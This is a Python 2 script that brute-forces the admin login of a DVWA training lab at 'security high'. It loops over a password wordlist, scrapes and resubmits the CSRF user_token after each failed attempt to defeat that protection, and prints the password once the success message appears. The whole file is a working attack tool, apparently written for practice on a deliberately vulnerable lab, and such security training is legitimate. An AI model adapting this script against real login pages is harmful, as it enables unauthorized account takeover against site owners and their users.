from sys import argv
import requests
from BeautifulSoup import BeautifulSoup as Soup

script, filename, success_message = argv
txt = open(filename)

url = 'http://dvwa.local/vulnerabilities/brute/'
cookie = {'security': 'high', 'PHPSESSID':'67m60jqvdnh5c4joc3599qdm7s'}
s = requests.Session()
target_page = s.get(url, cookies=cookie)

''' 
checkSuccess
@param: html (String)

Searches the response HTML for our specified success message
'''
def checkSuccess(html):
 # get our soup ready for searching
 soup = Soup(html)
 # check for our success message in the soup
 search = soup.findAll(text=success_message)
 
 if not search:
  success = False

 else:
  success = True
 return success

page_source = target_page.text
soup = Soup(page_source);
csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')

print 'DVWA URL' + url
print 'CSRF Token='+ csrf_token

with open(filename) as f:
 print 'Running brute force attack...'
 for password in f:
 
  print 'password tryed: ' + password
  password = password.strip()

  payload = {'username': 'admin', 'password': password, 'Login': 'Login', 'user_token': csrf_token}
  r = s.get(url, cookies=cookie, params=payload)
  success = checkSuccess(r.text)

  if not success:
   soup = Soup(r.text)
   csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
  else:
   print 'Password is: ' + password
   break

 if not success:
  print 'Brute force failed. No matches found.'
